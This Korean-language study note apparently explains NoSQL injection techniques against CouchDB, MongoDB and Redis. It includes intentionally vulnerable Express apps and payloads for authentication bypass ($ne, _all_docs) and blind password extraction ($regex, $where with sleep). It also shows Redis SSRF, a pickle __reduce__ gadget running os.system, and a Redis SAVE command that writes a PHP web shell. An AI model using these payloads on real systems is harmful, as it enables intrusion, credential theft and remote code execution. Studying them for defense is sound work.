# NoSQL Injection: Exploit Tech
*NoSQL(NRDBMS)와 관련된 내용은 [DBMS.md](https://github.com/augustf86/Today_I_Learn/blob/main/Security/Background/DBMS.md)의 Non-Relational DBMS 부분을 참고*

<br/>

## CouchDB 공격 기법
### nano 패키지
* NodeJS에서 CouchDB를 사용할 때 주로 사용하는 패키지 (아파치에서 개발)
    - 참고: [CouchDB nano 공식 github](https://github.com/apache/couchdb-nano)
* ```get``` 함수를 사용하여 ```_id``` 값을 통해 데이터를 조회하거나 ```find``` 함수를 통해 쿼리 기반으로 데이터를 가져올 수 있음
    | 사용하는 함수 | 공격 방법 |
    |----|-------|
    | ```get``` 함수 | 특수 구성 요소인 ```_all_docs```, ```_db``` 등에 접근해 데이터베이스의 정보를 획득할 수 있음 |
    | ```find``` 함수 | 연산자와 같이 객체 타입의 값을 입력해 개발자가 의도하지 않은 행위를 수행할 수 있음 |
    - nano 패키지의 ```get``` 함수의 구현
        ```javascript
        // https://github.com/apache/couchdb-nano/blob/main/lib/nano.js → Line 680-688
        function getDoc (docName, qs0, callback0) {
        const { opts, callback } = getCallback(qs0, callback0)

        if (missing(docName)) {
            return callbackOrRejectError(callback)
        }

        return relax({ db: dbName, doc: docName, qs: opts }, callback) // https://github.com/apache/couchdb-nano/blob/main/lib/nano.js → Line 257-461 (relax 함수)
        }
        ```
        + ```relax``` 함수를 호출하여 초기화 과정 중 할당된 cfg.url의 뒤에 DB 이름과 doc을 차례로 추가해 GET 메소드로 요청을 전송함
    - nano 패키지의 ```find``` 함수의 구현
        ```javascript
        //https://github.com/apache/couchdb-nano/blob/main/lib/nano.js → Line 1025-1036
        function find (query, callback) {
        if (missing(query) || typeof query !== 'object') {
            return callbackOrRejectError(callback)
        }

        return relax({
            db: dbName,
            path: '_find',
            method: 'POST',
            body: query
        }, callback)
        }
        ```
        + if문의 조건식을 이용해 전달된 쿼리가 NULL인지와 객체 타입이 아닌지를 검사하여 둘 중 하나라도 해당되면 에러를 발생시킴 → **객체 형태의 데이터를 전달할 수 있음을 알 수 있음**

<br/>

#### nano 패키지의 get 함수: all_docs 접근
이용자의 입력값을 ```get``` 함수의 인자로 사용할 경우 특수 구성 요소를 통해 데이터베이스의 정보를 획득할 수 있음
* ```get``` 함수의 구현을 보면 전달된 인자에 대해 앞서 배운 특수 구성 요소의 포함 여부를 검사하지 않는다는 것을 알 수 있음
* 정상적인 접근과 ```_all_docs``` 접근
    | 분류 | 예시 및 설명 |
    |-----|-----|
    | 정상적인 접근 | ```require('nano')('http://{username}:{password}@localhost:5984').use('users').get('guest', function(err, result){ console.log('err: ', err, ', result: ', result)})``` <br/> &nbsp;&nbsp; → 이용자가 요청한 user 데이터베이스의 guest 계정에 대한 정보를 얻을 수 있음 (get 함수의 첫번째 인자로 ```'guest'```를 입력함) |
    | ```_all_docs``` 접근 | ```require('nano')('http://{username}:{password}@localhost:5984').use('users').get('_all_docs', function(err, result){ console.log('err: ', err, ', result: ', result)})``` <br/> &nbsp;&nbsp; → 데이터베이스의 ```_all_docs```에 접근해 저장된 데이터베이스에 대한 모든 도큐먼트 정보들을 얻을 수 있음 (get 함수의 첫번째 인자로 ```'_all_docs'```를 입력함) |

<br/>

#### nano 패키지의 find 함수: 연산자 공격
객체 형태의 데이터를 입력받을 때 입력 값에 대한 검사가 부재하거나 미흡하다면 문제가 발생할 수 있음
* ```selector``` 안에서 연산자를 포함한 ```operator```를 사용할 수 있음 → 공격자가 조건식을 만들어 조건에 대항하지 않는 데이터를 모두 획득할 수 있음
* 올바른 데이터 조회와 악의적인 데이터 조회
    | 분류 | 예시 및 설명 |
    |----|--------|
    | 정상적인 쿼리 전송 | ```require('nano')('http://{username}:{password}@localhost:5984').use('users').find({'selector': {'_id': 'guest', 'upw': 'guest'}}, function(err, result){ console.log('err: ', err, ', result: ', result) })``` <br/> &nbsp;&nbsp; → 이용자가 요청한 users 데이터베이스의 guest 계정의 데이터를 조회함 (find의 selector로 '_id'와 'upw'에 ```'guest'```를 입력함) |
    | 연산자를 포함한 공격 쿼리 전송 | ```require('nano')('http://{username}:{password}@localhost:5984').use('users').find({'selector': {'_id': 'admin', 'upw': {'$ne': ''}}}, function(err, result){ console.log('err: ', err, ', result: ', result) })``` <br/> &nbsp;&nbsp; → 공격자가 요청한 users 데이터베이스의 admin 계정의 데이터를 조회할 때 upw의 값에 상관없이 admin 계정의 데이터를 조회함 (find의 selector로 'upw'에 연산자 ```'$ne'```를 사용해 ```''```이 아니면 데이터를 조회하도록 만들고 있음) |

<br/><br/>

### *CouchD 공격 기법 예시*
```javascript
// app.js 예제 (이용자가 전달한 uid에 해당하는 데이터를 조회하고 반환된 에러와 결과를 비교하여 인증 과정을 진행하는 코드)
const express = require('express');
const session = require('express-session');
const app = express();
app.use(express.json());
app.use(express.urlencoded({extended: false}));
app.use(session({'secret': 'secret'}));
const nano = require('nano')('http://{username}:{password}@localhost:5984');
const users = nano.db.use('users'); // { _id: 'admin', _rev: '1-22a458e50cf189b17d50eeb295231896', upw: 'secretpw' }

app.post('/auth', function(req, res){
    users.get(req.body.uid, function(err, result){ // 이용자가 전달된 uid에 해당하는 데이터를 조회하고 반환된 에러와 결과를 비교함
        if (err){ // 에러가 발생한 경우
            res.send('error');
            return;
        }
        if (result.upw == req.body.upw) { // 조회한 uid의 upw와 이용자가 입력한 upw가 일치하는 경우 인증에 성공
            req.session.auth = true;
            res.send('success');
        } else { // 그 외의 경우는 모두 인증 실패
            res.send('fail');
        }
    });
});

const server = app.listen(3000, function() {
    console.log('app.listen');
});
```
* ```get``` 함수의 인자로 전달되는 이용자의 입력값 ```uid```에 대해 어떠한 검사도 하지 않아 CouchDB 특수 구성 요소를 이용할 수 있음
* 이용자가 전송한 요청의 종류와 결과
    | 요청 | 예시 및 설명 |
    |---|-----|
    | 정상적인 요청 | 이용자가 admin(uid)와 secretpw(upw)를 전달하여 정상적으로 인증 과정을 거쳐 success를 반환받음 <br/> &nbsp;&nbsp; → 쿼리 실행이 정상적으로 이뤄졌기 때문에 err에는 ```null```이 저장되고, success가 반환됨 |
    | 에러가 발생하는 요청 | 이용자가 uid의 값으로 데이터베이스에 존재하지 않은 문자열을 전달하면 에러가 발생하여 error를 반환받음 (유효하지 않은 uid 값을 입력한 경우) <br/> &nbsp;&nbsp; → 쿼리 실행 도중 에러가 발생하여 err에는 요청에 대한 에러 정보(```404 Object Not Found```)가 저장되고, result에는 ```null```이 저장됨 |
    | ```_all_docs```를 이용한 요청 | 공격자가 uid의 값으로 ```_all_docs```를 입력하고 upw를 입력하지 않으면(undefined) 세션을 획득할 수 있음 <br/> &nbsp;&nbsp; → ```_all_docs```는 upw의 데이터를 반환하지 않아 ```undefined```가 result.upw에 저장되기 매문에 인증 조건을 만족하여 세션을 획득할 수 있음(인증 우회) |

<br/><br/><br/>

## MongoDB 공격 기법
### MongoDB Injection
이용자가 입력한 값의 타입을 검사하지 않거나 검사가 미흡할 때 MongoDB에서 주로 발생하는 취약점
* 공격자는 이를 통해 **연산자**를 입력하여 데이터베이스 정보를 획득할 수 있음
* GET과 POST 메소드 방식을 이용한 애플리케이션에서 입력값에 대한 어떠한 검사도 수행하지 않을 경우 발생하는 취약점
    | 메소드 | 공격 방법 |
    |---|-------|
    | GET 메소드 | 객체 형태의 값을 삽입하여 실행시킬 수 있음 |
    | POST 메소드 | POST 방식으로 입력값을 전달하는 함수를 작성하고 이를 통해 입력값을 전달함 (JSON 형식으로 데이터를 전달하면 객체 형태의 입력값을 전달할 수 있음) |
    - GET과 POST 메소드 방식 모두 **이용자의 입력값에 대한 타입을 검사하지 않으면 다양한 형태의 데이터를 전달할 수 있음**
        + 이용자가 입력값을 이용해 특정 기능을 수행할 수 있는 경우에 악의적인 행위를 수행할 수 있음

<br/>

#### *MongoDB Injection 취약점 예시*
```javascript
// 이용자가 입력한 uid와 upw에 해당하는 값을 데이터베이스(user collection)에 조회하는 예제 코드
const express = require('express');
const app = express();
const mongoose = require('mongoose');
const db = mongoose.connection;
mongoose.connect('mongodb://localhost:27017/', {useNewUrlParser: true, useUnifiedTopology: True});

// GET 메소드 방식을 사용함
app.get('/query', function(req, res){
    db.collection('user').find({ // db의 user 컬렉션에서 uid와 upw가 이용자의 입력값과 동일한 데이터를 검색함
        'uid': req.query.uid,
        'upw': req.query.upw // req.query.uid, req.query.upw를 '어떠한 검사도 없이' 그대로 사용하고 있음 → 객체 타입의 데이터를 전달할 수 있음
    }).toArray(function(err, result){
        if (err) throw err
        res.send(result);
    });
});

const server = app.listen(3000, function(){
    console.log('app.listen');
})
```
* MongoDB의 ```db.collection.find()``` 함수를 이용해서 이용자의 입력값인 uid, upw 값에 해당하는 정보를 조회함
    - 코드에서 입력값의 타입을 검사하지 않아 **객체 타입의 입력값을 통해 user 콜렉션의 데이터를 조회할 수 있음**
* 연산자를 이용해 user 콜렉션의 정보를 획득하는 공격 코드
    ```
    http://localhost/query?uid[$ne]=a&upw[$ne]=a
    ```
    - uid와 upw에 지정된 값과 같지 않는 값을 찾는 ```$ne``` 연산자를 삽입 → uid가 "a"가 아니고, upw가 "a"가 아닌 값을 조회하므로 손쉽게 계정 정보를 탈취할 수 있음
        + 관리자 계정을 조회하기 위한 방법
            ```
            http://localhost/query?uid=admin&upw[$ne]=a
            ```
            - uid가 "admin"이고, upw가 "a"가 아닌 값을 조회하여 upw의 값과 상관 없이 uid가 "admin"인 데이터를 조회할 수 있음
* 동일한 코드를 GET 메소드가 아니라 POST 메소드 방식으로 요청 시 Post Data를 아래와 같이 구성함
    ```javascript
    // POST 메소드 방식을 사용
    app.post('/query', function(req, res){
        db.collection('user').find({
            'uid': req.body.uid,
            'upw': req.body.upw // req.body.uid, req.body.upw를 '어떠한 검사도 없이' 그대로 사용하고 있음 → JSON 형식으로 객체 타입의 데이터를 전달할 수 있음
        }).toArray(function(err, result) {
            if (err) throw err;
            res.send(result);
        })
    })
    ```
    - ```$ne```(not equal) 연산자를 사용해서 uid 또는 upw를 모르는 상황에서도 원하는 데이터를 조회할 수 있음
        | Post Data | 설명 |
        |-----|--------|
        | { "uid": {"$ne": ""}, "upw": {"$ne": ""}} | uid가 ''와 같지 않고(ne), upw가 ''와 같지 않는(ne) 데이터를 조회 |
        + 관리자 계정을 조회하기 위한 방법
            | Post Data | 설명 |
            |---|------|
            | { "uid": "admin", "upw": {"$ne": ""}} | uid가 'admin'이고, upw가 ''와 같지 않은 데이터를 조회 <br/> &nbsp;&nbsp;→ upw 값에 상관 없이 uid가 'admin'인 데이터를 조회함 |

<br/><br/>

### MongoDB Blind Injection
MongoDBd에서 쿼리의 샐행 결과가 애플리케이션에 출력되지 않는 경우 사용할 수 있는 공격 방법
* ```$regex```와 ```$where```를 통해 Blind Injection을 수행할 수 있음
    | 연산자 | 공격 방법 |
    |---|------|
    | ```$regex``` | 쿼리에서 정규식을 사용할 수 있도록 하는 연산자 → 정규식으로 한 글자씩 비교하여 참/거짓 반환 결과를 통해 데이터를 알아낼 수 있음 |
    | ```$where``` | 자바스크립트의 식과 함께 데이터를 비교할 수 있도록 하는 연산자(필드 안에서 사용 불가) → 자바스크립트 식을 실행시켜 참/거짓 반환 여부 등을 통해 데이터를 알아낼 수 있음(길이 정보는 length, 각 위치 별 데이터는 ```substring()``` 함수를 사용하여 알아냄) |

<br/>

#### *MongoDB Blind Injection 예시*
```javascript
// 이용자가 입력한 값을 이용해 데이터를 조회하는 예제 코드(참/거짓 여부를 반환함)
const express = require('express');
const app = express();
app.use = express();
app.use(express.urlencoded( {extended : false }));

const mongoose = require('mongoose');
const db = mongoose.connection;
mongoose.connect('mongodb://localhost:27017/', {useNewUrlParser: true, useUnifiedTopology: true});

// POST 메소드 방식을 사용함
app.get('/query', function(req, res){
    db.collection('user').findOne({ // db의 user 컬렉션에서 uid와 upw가 이용자의 입력값과 동일한 데이터를 검색함
        'uid': req.query.uid,
        'upw': req.query.upw // req.body.uid, req.body.upw를 '어떠한 검사도 없이' 그대로 사용하고 있음 → JSON 형식으로 객체 타입의 데이터를 전달할 수 있음
    }, function(err, result){
        if (err) throw err;
        console.log(result);
        if (result) { // 로그인에 성공할 경우 uid만 출력하기 때문에 Blind Injection을 통해 한 글자씩 알아내야 함
            res.send(result['uid']);
        } else {
            res.send('undefined');
        }
    })
});

const server = app.listen(80, function(){
    console.log('app.listen')
});
```
* ```$regex```를 이용해 admin 계정의 비밀번호를 획득하는 방법
    - 비밀번호의 길이 정보 획득
        | Post Data | 설명 | 결과 |
        |-----|------|----|
        | { "uid": "admin", "upw": {"$regex": ".{5}"}} | upw의 길이가 5인지 확인 | admin 출력 |
        | { "uid": "admin", "upw": {"$regex": ".{6}"}} | upw의 길이가 6인지 확인 | undefined 출력 |
        + 정규식 ```.{숫자}```에서 ```.```은 모든 문자 하나와 일치하고, ```{...}```은 반복을 나타냄 → 중괄호 안의 숫자만큼 ```.```을 반복함
    - 비밀번호의 길이를 확인한 후 입력의 시작 부분을 나타내는 ```^```를 이용하여 위치 별로 알파벳 소문자를 하나씩 비교해가며 응답에 따라 참/거짓을 확인할 수 있음
        | Post Data | 설명 | 결과 |
        |-----|------|----|
        | {"uid": "admin", "upw": {"$regex" : "^b"}} | upw의 첫 글자가 b인지 확인 | undefined |
        | {"uid": "admin", "upw": {"$regex" : "^a"}} | upw의 첫 글자가 a인지 확인 | admin (첫 글자는 a) |
        | {"uid": "admin", "upw": {"$regex" : "^aa"}} | upw의 두번째 글자가 a인지 확인 | undefined |
        | ... | ... | ... |
        | {"uid": "admin", "upw": {"$regex" : "^apple"}} | upw의 다섯번째 글자가 e인지 확인 | admin (비밀번호는 apple) |

<br/><br/>

### MongoDB Error & Time based Injection
MongoDB에서 쿼리 결과를 애플리케이션의 기능에서 출력하지 않는 경우 임의로 에러를 발생시키거나 시간 지연을 통해서 SQL Injection 성공 여부를 알아낼 수 있음
* ```$where``` 연산자를 통해서 Error & Time based Injection을 수행할 수 있음
    | SQL Injection 종류 | 공격 방법 |
    |-----|-------|
    | Time based Injection | 쿼리의 뒤에 AND 연산자를 사용해 시간 지연을 발생시키는 함수 ```sleep()```을 연결함 <br/>&nbsp;&nbsp; → 앞의 쿼리의 결과가 참이라면 시간 지연 함수가 실행됨 |
    | Error based Injection | 쿼리의 뒤에 AND 연산자를 사용해 문법 에러 등 에러를 발생시킬 수 있는 문자열 등을 삽입함 <br/>&nbsp;&nbsp; → 앞의 쿼리의 결과가 참이라면 에러가 발생됨 |

<br/>

#### *MongoDB Error & Time based Injection 예시*
```javascript
// 데이터 조회 코드
db.collection('user').find(
    {$where: `this.uid=='${req.query.uid}'&&this.upw=='${req.query.upw}'`}
)
```
* MongoDB Time based Injection을 사용하여 Blind Injection을 수행하는 방법
    - AND 연산자를 사용해 결과가 참이 되면 시간 지연 함수 ```sleep()```가 실행되도록 함
        | [GET] URL 뒷부분 | 설명 | 결과 |
        |-----|-----|---|
        | ```/?uid=admin'&&this.upw.substring(0,1)=='u'&&sleep(5000)&&'1``` | uid가 'admin'이고 upw의 첫번째<br/> 문자가 u이면 sleep(5000)를 실행함 | 시간 지연<br/> 발생 X (거짓) |
        | ```/?uid=admin'&&this.upw.substring(0,1)=='p'&&sleep(5000)&&'1``` | uid가 'admin'이고 upw의 첫번째<br/> 문자가 p이면 sleep(5000)를 실행함 | 시간 지연<br/> 발생 X (거짓) |
        | ... | ... | ... |
        | ```/?uid=admin'&&this.upw.substring(0,1)=='a'&&sleep(5000)&&'1``` | uid가 'admin'이고 upw의 첫번째<br/> 문자가 a이면 sleep(5000)를 실행함 | 시간 지연<br/> 발생 (참) |
* MongoDB Error based Injection을 사용하여 Blind Injection을 수행하는 방법
    - AND 연산자를 사용해 결과가 참이 되면 문법 에러가 발생하는 ```asdf```가 실행되도록 함
        + [POST] Post Data: ```{$where: "this.uid=='admin'&&this.upw.substring(0,1)=='u'&&asdf&&'1'&&this.upw=="${upw}'"}```
            - uid가 'admin'이고 upw의 첫번째 문자가 u이면 asdf에 의해 문법 에러 발생 → 에러 발생 X (거짓)
        + [POST] Post Data: ```{$where: "this.uid=='admin'&&this.upw.substring(0,1)=='a'&&asdf&&'1'&&this.upw=="${upw}'"}```
            - uid가 'admin'이고 upw의 첫번째 문자가 a이면 asdf에 의해 문법 에러 발생 → 에러 발생 (참)

<br/><br/><br/>

## Redis 공격 기법
### NodeJS redis 모듈 (처리 방식을 이용한 공격)
```javascript
// redis 모듈 사용 예시 코드
var express = require('express');
var app = express();
app.use(express.json());
app.use(express.urlencoded({extended:false}));
const redis = require("redis");
const client = redis.createClient();

app.get('/init', function(req, res) {
    // client.set("key", "value");
    // 이용자가 입력하는 uid(req.query.uid) 키에 {level: 'guest'}를 값으로 저장함
    client.set(req.query.uid, JSON.stringify({level: 'guest'}));
    res.send('ok');
});

var server = app.listen(3000, function() {
    console.log('app.listen');
})
```
* ```req.query```에 해당하는 부분에 문자열 외에도 배열(Array) 또는 객체 타입의 데이터도 삽입할 수 있음
    - 이용자의 입력값(```req.query.uid```)의 타입 별 처리 방식
        | 입력값 타입 | 처리 방식(command 라이브러리 코드의 return 부분) |
        |----|--------|
        | 문자열 타입 | (입력) key, value, callback → ```new Command(command, [key, value], callback)``` |
        | 배열 타입 | (입력) [ key, value ] → ```new Command(command, key, value)``` <br/> &nbsp;&nbsp; → if문에서 len이 2이면 callback를 배열의 두 번째 값으로 설정하기 때문 |
        + redis 모듈의 command 라이브러리 코드의 일부
            ```javascript
            // https://github.com/NodeRedis/node-redis/blob/0041e3e53d5292b13d96ce076653c5b91b314fda/lib/commands.js → Line 20 - 25, 46
            if (Array.isArray(arguments[0])) {
                arr = arguments[0];
                if (len === 2) {
                    callback = arguments[1];
                }
            }
            return this.internal_send_command(new Command(command, arr, callback));
            ```
    - 배열 타입으로 값을 입력할 경우 개발자가 의도한 값이 적용되지 않고 임의로 입력한 값이 삽입됨 → 공격자가 배열 타입의 인자를 전달할 경우 악의적인 요청을 수행하도록 할 수 있음
        + ```http://localhost:3000/init?uid[]=test&uid[]={"level": "admin"}```를 전달하면 애플리케이션에서는 ```Command("set", "test", {"level": "admin"})``` 코드가 실행되어 공격자가 임의의 값을 가진 데이터를 생성할 수 있음

<br/><br/>

### SSRF
* Redis는 기본적으로 인증 수단이 존재하지 않으며 "127.0.0.1"로 서비스를 바인딩함 → 직접 접근하여 인증 과정 없이 명령어를 실행할 수 있음
    - 공격자는 애플리케이션의 SSRF 취약점을 통해 Redis 서버에 접근하여 데이터베이스의 정보를 획득할 수 있음
* SSRF 공격 기법
    - 유효하지 않은 명령어 삽입
        + 유효하지 않은 명령어가 입력돼도 연결이 끊어지지 않고 다음 명령어를 실행하는 Redis의 특징을 이용하여 유효하지 않은 명령 뒤에 임의의 명령어를 삽입하여 Redis에서 실행시킴
    - HTTP 프로토콜 이용
        + HTTP의 Body 데이터에 실행할 명령어를 포함시켜 요청을 전송하면 애플리케이션에서 Redis 명령어가 포함된 Body 데이터를 처리할 때 해당 명령어를 Redis에서 실행함
            - 예제 요청 코드
                ```
                POST / HTTP/1.1
                host: 127.0.0.1:6379
                user-agent: Mozilla/5.0....
                content-type: application/x-www-form-urlencoded
                data=a
                SET key value
                ```
                - Body에 포함된 ```SET key value``` 명령어(새로운 데이터 추가)를 Redis에서 실행시킴

<br/>

#### SSRF 공격 기법 패치
* HTTP 프로토콜을 이용한 SSRF를 막기 위해 프로토콜에서 사용하는 주요 키워드가 명령어로 입력되면 연결을 끊어 공격이 불가능하도록 패치함
    - Redis 패치 코드 (src/networking.c) 일부
        ```c
        // https://github.com/redis/redis/commit/a81a92ca2ceba364f4bb51efde9284d939e7ff47#diff-252bce0cc340542712f0c1adf62e9035ea47a4a064321fbf40ec3dd4b814aaf2R1624 (src/networking.c)
        /* This callback is bound to POST and "Host:" command names. Those are not
        * really commands, but are used in security attacks in order to talk to
        * Redis instances via HTTP, with a technique called "cross protocol scripting"
        * which exploits the fact that services like Redis will discard invalid
        * HTTP headers and will process what follows.
        *
        * As a protection against this attack, Redis will terminate the connection
        * when a POST or "Host:" header is seen, and will log the event from
        * time to time (to avoid creating a DOS as a result of too many logs). */
        void securityWarningCommand(client *c) {
            static time_t logged_time;
            time_t now = time(NULL);

            if (labs(now-logged_time) > 60) {
                serverLog(LL_WARNING,"Possible SECURITY ATTACK detected. It looks like somebody is sending POST or Host: commands to Redis. This is likely due to an attacker attempting to use Cross Protocol Scripting to compromise your Redis instance. Connection aborted.");
        ```
        + 주석을 보면 ```POST```와 ```"Host:"``` 키워드가 포함되어 있으면 클라이언트와의 연결을 끊어 다음 명령어가 실행되지 않도록 함
            | 필터링 키워드 | 예시 |
            |----|-------|
            | ```post``` | ```echo -e "post a\r\nget hello" | nc 127.0.0.1 6379``` |
            | ```host:``` | ```echo -e "host: a\r\nget hello" | nc 127.0.0.1 6379``` |
            - 위의 패치 코드에서 ```serverLog(LL_WARNING, "Possible ... aborted.");```에 의해 해당 키워드가 사용될 수 없음이 출력되며 연결이 끊어짐
    - HTTP 프로토콜을 이용한 공격만을 막기 때문애 다른 프로토콜을 이용한 공격에는 여전히 취약할 수 밖에 없음

<br/><br/>

### django-redis-cache
Django에서 Redis를 사용한 캐시(Cache)를 구현할 수 있는 파이썬 모듈
* django-redis-cache 모듈의 ```get_serializer_class``` 함수
    ```python
    # https://github.com/sebleier/django-redis-cache/blob/cabfcb24476e562fa7275f77bc55f835d125e26c/redis_cache/backends/base.py → Line 132-137
    def get_serializer_class(self):
        # serializer_class를 가져올 때 options의 SERIALIZER_CLASS의 값을 가져옴 (해당 값이 없을 경우에믄 redis_cache.serializers.PickleSerializer를 사용함)
        serializer_class = self.options.get(
            'SERIALIZER_CLASS',
            'redis_cache.serializers.PickleSerializer' # PickleSerializer 클래스는 아래쪽을 참고
        )
        return import_class(serializer_class)

    # https://github.com/sebleier/django-redis-cache/blob/cabfcb24476e562fa7275f77bc55f835d125e26c/redis_cache/serializers.py → Line 33-42
    class PickleSerializer(object):
        # django-redis-cache 모듈의 기본 Serializer = PickleSerializer
        def __init__(self, pickle_version=-1):
            self.pickle_version = pickle_version

        def serialize(self, value):
            return pickle.dumps(value, self.pickle_version)

        def deserialize(self, value):
            return pickle.loads(force_bytes(value))
    ```
    - Redis에 임의의 데이터를 저장하고 해당 데이터를 Deserialize할 수 있는 경우 Pickle 모듈을 이용해 공격을 수행할 수 있음
* django-redis-cache 모듈 사용 예시
    ```python
    # settings.py
    CACHE = {
        "default": {
            "BACKEND": "django_redis.cache.RedisCache",
            "LOCATION": "redis://127.0.0.1:6379/"
        }
    }

    # view.py
    from djagno.http import HttpResponse
    from .models import Memo
    from django.core.cache import cache

    def p_set(request):
        # p_set 함수 실행 시 cache.set 함수를 사용해 cache_memo라는 키를 생성함 (키의 값을 출력하면 Pickle로 덤프되어 있음)
        cache.set('cache_memo', Memo('memo test!'))
        return HttpResponse('set session')
    ```

<br/>

#### Serialize(직렬화)/Deserialize(역직렬화)
* Serialize와 Deserialize
    | 용어 | 정의 |
    |---|--------|
    | 직렬화(Serialize) | 객체 또는 데이터의 타입을 특정한 포맷을 가진 형태로 변환하는 작업 |
    | 역직렬화(Deserialize) | 직렬화된 데이터를 본래 객체 또는 데이터의 타입으로 되돌리는 것 |
    - 직렬화는 객체 및 데이터의 현재 상태와 타입들을 저장하고, 필요할 때 역직렬화를 통해 사용할 수 있음
        + 예제 코드
            ```python
            import pickle # 파이썬에서 직렬화와 역직렬화를 수행하는 대표적인 모듈 중 하나

            class TestClass:
                def __init__(self, a, b):
                    self.A = a
                    self.B = b
            
            ClassA = TestClass(31337, 10001) # TestClass를 생성하여 ClassA로 할당
            ClassA_dump = pickle.dumps(ClassA) # 31337과 10001을 가지는 ClassA를 직렬화함
            print(ClassA_dump) # 출력: b"\x80\x03cmain\nTestClass\nq\x00)\x81q\x01}q\x02(X\x01\x00\x00\x00Aq\x03MizX\x01\x00\x00\x00Bq\x04M\x11'ub."

            ClassB = pickle.loads(ClassA_dump) # ClassA를 역직렬화한 데이터를 ClassB에 저장함
            print(ClassB.A, ClassB.B) # 출력: 31337 10001
            ```
    - 공격자는 역직렬화 과정을 악용하여 악의적인 행위를 수행하거나, 특정 상황에서 호출되는 메소드를 이용해 공격할 수 있음
* pickle 모듈을 이용한 Serialize/Deserialize 공격
    - [pickle 모듈](https://docs.python.org/3/library/pickle.html)
        + 객체를 직렬화하여 팡리에 저장할 수 있는 기능과 파일에 저장된 객체를 가져와 역직렬화하는 기능을 제공함
            - 아래와 같이 공식문서에서는 신뢰할 수  있는 데이터에 한하여 역직렬화를 수행해라는 경고문이 존재함
                <img width="814" alt="pickle 경고문" src="https://github.com/augustf86/Today_I_Learn/assets/122844932/4272541c-8dd8-40b3-a163-892362dafd89">
        + ```object.__reduce__()```: 객체 계층 구조를 unpickling할 때 객체를 재구성하는 튜플을 반환해주는 메소드 (호출 가능한 객체를 반환해줄 수 있음)
            - 호출 가능한 객체에 ```system```과 같이 명령어를 실행할 수 있는 함수를 반환하면 시스템 명령어를 실행할 수 있다는 의미
                ```python
                # __reduce__를 이용한 명령어 실행 예제
                import pickle
                import os # os.system(): 전달된 인자를 셸 프로그램에 전달해 명령어를 실행할 수 있는 파이썬 함
                
                class TestClass:
                    def __reduce__(self):
                        return os.system, ("id", )
                
                ClassA = TestClass()
                ClassA_dump = pickle.dumps(ClassA) # ClassA를 직렬화
                print(ClassA_dump) # 출력: b'\x80\x03cposix\nsystem\nq\x00X\x02\x00\x00\x00idq\x01\x85q\x02Rq\x03.'
                
                pickle.loads(ClassA_dump) # ClassA_dump를 역직렬화 → 역직렬화 수행 과정 중에 id 명령어가 실행되어 uid, gid, groups에 대한 정보가 출력됨
                ```

<br/><br/>

### Redis 명령어를 이용한 공격
#### Redis 명렁어: SAVE
* Redis는 메모리(In-Memory) 데이터베이스로, 휘발성을 갖는 메모리에 데이터를 저장하기 때문에 데이터 손실 방지를 위해 일정 시간마다 메모리 데이터를 파일 시스템에 저장함
    -  ```SAVE``` 명령어를 사용하여 메모리의 데이터를 파일 시스템에 저장할 수 있음
        | commands | syntax | description | 공식 문서 |
        |----|-----|-----------|-----|
        | SAVE | ```SAVE``` | RDB 파일 형식으로 Redis 인스턴스 내부의 모든 데이터에 대한 특정 시점의 스냅샵을 생성하는 데이터 세트의 동기식 저장(synchronous save)을 수행함 → 명령 성공 시 OK를 반환함 | 📚 [Redis SAVE](https://redis.io/commands/save/)|
        + 메모리 데이터를 저장하는 파일의 저장 주기를 지정하거나 즉시 저장할 수 있음
        + 저장되는 파일의 경로와 이름, 그리고 저장할 데이터를 함께 설정할 수 있음
    - ```SAVE``` 명령어를 이용한 웹 셸 삽입 예시
        ```
        CONFIG set dir /tmp
        CONFIG set dbfilename redis.php
        SET test "<?php system($_GET['cmd']); ?>"
        SAVE
        ```
        + 파일 저장 경로(dir)를 "/tmp"로, 파일 이름(dbfilename)을 redis.php"로 지정한 다음 셸을 실행하는 PHP 코드를 작성하고 이를 저장함(SAVE)
            - 성공적으로 실행되면 redis.php 생성되고 공격자는 이를 통해서 PHP 등의 다른 애플리케이션과 연계해 공격을 수행할 수 있음

<br/>

#### Redis 명령어: SLAVEOF/REPLICAOF
* 현재 명령어를 실행하는 노드의 마스터 노드로 지정한 다른 Redis 노드는 연결을 맺은 후 마스터 노드의 데이터를 복제하고 저장함
    - ```SLAVEOF```/```REPLICAOF``` 명령어를 사용하여 마스터 노드를 복제할 수 있음
        | commands | syntax | description | 공식 문서 |
        |----|-----|-----------|-----|
        | SLAVEOF(deprecated) | ```SLAVEOF host port``` | 현재 서버(노드)를 지정된 호스트 및 포트에서 수신하는 다른 서버(마스터 노드)의 복제본으로 만듦 (이미 복제되어 있을 경우에는 이전 서버에 대한 복제를 중지하고 저장한 데이터를 버린 이후 새 서버에 대한 동기화를 시작함) | 📚 [Redis SLAVEOF](https://redis.io/commands/slaveof/) |
        | | ```SLAVEOF NO ONE``` | 복제를 중지하고 현재 Redis 서버(노드)를 마스터 서버로 전환함 (복제한 데이터를 버리지는 않음) | |
        | REPLICAOF | ```REPLICAOF host port``` | 현재 서버(노드)를 지정된 호스트 및 포트에서 수신하는 다른 서버(마스터 노드)의 복제본으로 만듦 (이미 마스터 노드와 연결되어 있을 경우 이전 서버에 대한 복제를 중지하고 저장된 데이터를 버린 이후 새 서버에 대한 동기화를 시작함) | 📚 [Redis REPLICAOF](https://redis.io/commands/replicaof/) |
        | | ```REPLICAOF NO ONE``` | 복제를 중지하고 현재 Redis 서버(노드)를 마스터 서버로 전환함 (복제한 데이터를 버리지는 않음) | |
        + 명령어 실행 시 마스터 노드에 네트워크 연결을 맺음 → 네트워크 트래픽을 통해 Redis 공격의 성공 여부를 원격으로 확인할 수 있음
        + Redis 5.0 버전부터는 ```SLAVEOF``` 명령어 대신 ```REPLICAOF``` 명령어를 사용함 (```REPLICAOF``` 명령어 사용을 권장함)
            - 이전 버전과의 호환성을 위해 여전히 ```SLAVEOF```는 동작함
    - ```SLAVEOF```/```REPLICAOF``` 명령어를 사용한 공격 예시
        | Redis 서버에서 실행한 명령어 | 복제한 서버(마스터 노드)에서 지정한 포트를 바인딩하는 명령어를 실행한 결과 |
        |-----|-----|
        | ```SLAVEOF 127.0.0.1 8888``` <br/> 또는 <br/> ```REPLICAOF 127.0.0.1 8888```<br/> *→ 127.0.0.1 호스트의 8888번 포트로 연결* | $ nc -l 8888 -kv <br/> Listening on [0.0.0.0] (family 0, port 8888) <br/> Connection from [127.0.0.1] port 8888 [tcp/*] accepted (family 2, sport 52613) <br/> PING |
        + 포트를 바인딩하는 서버의 결과를 보면 노드의 상태를 확인하기 위한 데이터를 수신한 것을 알 수 있음

<br/>

#### Redis 명령어: MODULE LOAD
